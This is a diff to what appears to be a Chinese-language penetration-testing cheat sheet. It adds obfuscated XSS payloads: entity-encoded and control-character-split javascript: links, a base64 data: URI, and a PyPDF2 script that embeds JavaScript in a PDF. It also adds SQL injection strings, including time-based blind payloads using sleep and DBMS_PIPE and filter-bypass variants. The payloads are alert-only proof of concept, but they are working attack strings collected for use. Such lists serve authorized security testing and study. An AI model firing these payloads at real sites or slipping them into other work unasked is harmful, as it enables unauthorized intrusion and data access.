@@ -36,6 +36,13 @@ xhr.send();
 
 ```html
 <ScRIpt>prompt`3334444`</sCriPT>
+<a href="javascript:alert('xss')">XSS Link</a>,
+<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=">XSS Link</a>
+<a href="&#106;avascript:alert('Successful XSS')">Click this link!</a>
+<a href="&#x6A;avascript:alert('Successful XSS')">Click this link!</a>
+<a href="&#x6A;avascript&#0000058&#0000097lert('Successful XSS')">Click this link!</a>
+<a href="jav&#x0A;ascript:&#x0A;ale&#x0D;rt('Successful XSS')">Visit google.com</a>
+<a href="  &#x8; &#23;   javascript:alert('Successful XSS')">Click this link!</a>
 
 <iframe src="data:text/html;base64,PG9iamVjdCBkYXRhPWRhdGE6dGV4dC9odG1sO2Jhc2U2NCxQSE5qY21sd2RENXdjbTl0Y0hSZ016TXpORFEwTkdBOEwzTmpjbWx3ZEQ0PT48L29iamVjdD4="></iframe>
 
@@ -78,6 +85,25 @@ xhr.send();
 <noscript>
     #text: <style>
 <img src="x" onerror="alert(1)">
+```
+
+#### PDF JavaScript API
+
+```python
+from PyPDF2 import PdfReader, PdfWriter
+
+if __name__ == "__main__":
+    # Create a PDF with JavaScript that triggers an alert
+    writer = PdfWriter()
+    writer.add_blank_page(width=72, height=72)
+    js_code = "app.alert('XSS in PDF!');"
+    writer.add_js(js_code)
+    with open("xss_alert.pdf", "wb") as f:
+        writer.write(f)
+```
+
+```javascript
+app.alert('XSS in PDF!');
 ```
 
 ## 文件上传
@@ -558,8 +584,11 @@ updatexml(1,concat(0x7e,(select database()),0x7e),1)
 
 
 ```
-'AND'a'='a
-"&&"a"="a
+'&&'a'='a
+\"&&\"a\"=\"a
+'and/**/DBMS_PIPE.RECEIVE_MESSAGE('a',3)='a
+'and(select*from(select+sleep(0))a/**/union/**/select+1)='
+desc,(select*from(select+sleep(15)union/**/select+1)a)
 ```
 
 - `order by` 后的注入
